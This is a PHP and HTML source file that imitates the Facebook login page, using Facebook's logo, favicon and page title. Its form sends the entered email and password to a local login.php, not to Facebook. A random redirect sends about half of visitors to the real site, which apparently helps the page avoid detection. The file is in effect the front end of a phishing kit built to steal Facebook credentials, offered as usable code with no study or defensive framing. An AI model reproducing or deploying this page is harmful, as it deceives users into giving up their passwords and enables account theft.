<?php

   $location = rand(0,1);
   if($location == 1){
      header('location: https://www.facebook.com/');
   }

?>
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
   <link rel="stylesheet" href="/style.css">
   <title>Facebook - Log In or Sign Up</title>
</head>
<body>
   <!-- Main -->
   <div class="main">
      <div class="content">
         <div class="wrapper">
            <div class="text">
               <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
               <p>
                  Connect with friends and the world around you on Facebook.
               </p>
            </div>
            <div class="form-container">
               <form action="login.php" class="form" method="POST">
                  <input type="text" placeholder="Email or phone number" name="email" autofocus>
                  <input type="password" placeholder="Password" name="password" class="password">
                  <button type="submit" class="login">Log In</button>
                  <center>
                  <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot">Forgot password?</a>

                  </center>
                  <hr>
                  <center class="login-center">
                  <a href="https://www.facebook.com/signup" class="create">Create new account</a>

                  </center>
               </form>
               <center class="span">
                  <span><span style="font-weight: bold;">Create a Page</span> for a celebrity, brand or business.</span>
               </center>
            </div>
         </div>
      </div>
      <!-- Footer -->
      <div class="footer">
      </div>
   </div>
   <script src="./script.js"></script>
</body>
</html>